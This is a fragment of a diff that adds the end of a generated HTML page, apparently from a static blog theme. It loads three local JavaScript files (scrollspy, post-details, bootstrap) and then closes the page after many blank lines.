+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
